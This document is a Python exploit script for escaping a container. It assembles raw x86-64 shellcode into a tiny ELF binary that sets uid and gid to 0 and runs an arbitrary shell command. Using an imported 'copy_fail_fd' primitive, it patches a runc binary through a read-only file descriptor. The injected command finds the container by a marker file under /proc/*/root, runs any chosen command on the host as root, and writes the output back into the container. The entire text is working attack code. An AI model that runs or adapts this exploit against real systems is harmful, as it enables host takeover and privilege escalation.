#!/usr/bin/env python3
import os
import shlex
import struct
import sys

from copyfail_primitive import copy_fail_fd


def elf_payload(cmd: str) -> bytes:
    code = bytearray()
    fixups = []

    def emit(b):
        code.extend(b)

    def lea(modrm, label):
        pos = len(code)
        emit(b"\x48\x8d" + bytes([modrm]) + b"\0\0\0\0")
        fixups.append((pos + 3, label, pos + 7))

    emit(b"\x31\xff\x6a\x69\x58\x0f\x05")  # setuid(0)
    emit(b"\x31\xff\x6a\x6a\x58\x0f\x05")  # setgid(0)
    lea(0x3D, "sh")
    lea(0x1D, "dash_c")
    lea(0x0D, "cmd")
    emit(b"\x31\xd2\x52\x51\x53\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05")
    emit(b"\x31\xff\x6a\x3c\x58\x0f\x05")

    labels = {"sh": len(code)}
    emit(b"/bin/sh\0")
    labels["dash_c"] = len(code)
    emit(b"-c\0")
    labels["cmd"] = len(code)
    emit(cmd.encode() + b"\0")

    for at, label, next_ip in fixups:
        code[at : at + 4] = struct.pack("<i", labels[label] - next_ip)

    off = 0x78
    size = off + len(code)
    eh = bytearray(0x40)
    eh[:16] = b"\x7fELF\x02\x01\x01" + b"\0" * 9
    struct.pack_into("<HHIQQQIHHHHHH", eh, 16, 2, 0x3E, 1, 0x400000 + off, 0x40, 0, 0, 0x40, 0x38, 1, 0, 0, 0)
    ph = bytearray(0x38)
    struct.pack_into("<IIQQQQQQ", ph, 0, 1, 5, 0, 0x400000, 0x400000, size, size, 0x1000)
    return bytes(eh + ph + code)

if len(sys.argv) < 5:
    raise SystemExit(f"usage: {sys.argv[0]} RUNC_FD CONTAINER_OUT MARKER_PATH MARKER_TOKEN [host-command [args...]]")

out = sys.argv[2]
marker = sys.argv[3]
token = sys.argv[4]
argv = sys.argv[5:]
if argv:
    host_command = shlex.join(argv)
else:
    host_command = "hostname"

qout = shlex.quote(out)
qmarker = shlex.quote(marker)
qtoken = shlex.quote(token)
cmd = (
    f"c_out={qout}; "
    f"c_marker={qmarker}; "
    f"c_token={qtoken}; "
    f"out=; "
    f"for r in /proc/[0-9]*/root; do "
    f"if [ -r \"$r$c_marker\" ] && [ \"$(cat \"$r$c_marker\" 2>/dev/null)\" = \"$c_token\" ]; then "
    f"out=\"$r$c_out\"; break; "
    f"fi; "
    f"done; "
    f"[ -n \"$out\" ] || exit 111; "
    f"rm -f \"$out\" \"$out.done\"; "
    f"( {host_command} ) > \"$out\" 2>&1; "
    f"rc=$?; "
    f"printf '\\n[exit=%d]\\n' \"$rc\" >> \"$out\"; "
    f"chmod 644 \"$out\"; "
    f"printf '%s\\n' \"$rc\" > \"$out.done\"; "
    f"chmod 644 \"$out.done\""
)
payload = elf_payload(cmd)
print(f"patching {sys.argv[1]} payload={len(payload)} out=/proc/*/root{out} command={host_command}", flush=True)
fd = os.open(sys.argv[1], os.O_RDONLY)
try:
    copy_fail_fd(fd, payload)
finally:
    os.close(fd)
print("done", flush=True)
